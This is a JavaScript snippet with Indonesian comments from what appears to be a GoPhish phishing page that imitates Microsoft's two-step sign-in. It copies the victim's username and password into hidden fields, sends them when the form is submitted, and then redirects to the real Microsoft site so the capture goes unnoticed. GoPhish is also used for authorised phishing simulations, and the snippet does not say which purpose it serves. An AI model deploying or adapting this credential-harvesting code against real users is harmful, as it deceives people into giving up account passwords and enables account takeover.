<script>
    // URL Pengalihan (Redirect) setelah data ditangkap oleh GoPhish
    // Ganti dengan URL Microsoft yang sebenarnya, misal: 'https://www.microsoft.com/id-id'
    const REDIRECT_URL = "https://www.microsoft.com/id-id"; 

    // Fungsi untuk menampilkan langkah password
    function showPasswordStep() {
        const username = document.getElementById('input_username').value;
        if (username) {
            // Simpan username ke hidden field GoPhish
            document.getElementById('hidden_username').value = username;

            // Tampilkan langkah password, sembunyikan langkah username
            document.getElementById('step_username').style.display = 'none';
            document.getElementById('step_password').style.display = 'block';
            document.getElementById('input_password').focus();
        } else {
            alert("Please enter your email, phone, or Skype.");
        }
    }

    // Fungsi untuk kembali ke langkah username
    function showUsernameStep() {
        document.getElementById('step_password').style.display = 'none';
        document.getElementById('step_username').style.display = 'block';
        document.getElementById('input_username').focus();
    }

    // Tangani pengiriman formulir GoPhish
    document.getElementById('gophish_form').onsubmit = function() {
        const password = document.getElementById('input_password').value;
        
        // Simpan password ke hidden field GoPhish
        document.getElementById('hidden_password').value = password;
        
        // Data telah ditangkap GoPhish. Sekarang, alihkan pengguna.
        setTimeout(function() {
            window.location.href = REDIRECT_URL;
        }, 100); // Penundaan singkat untuk memastikan pengiriman data ke GoPhish

        // GoPhish menangani POST request, jadi tidak perlu preventDefault() di sini 
        // selama form ACTION sudah disetel dengan benar oleh GoPhish.
    };
</script>
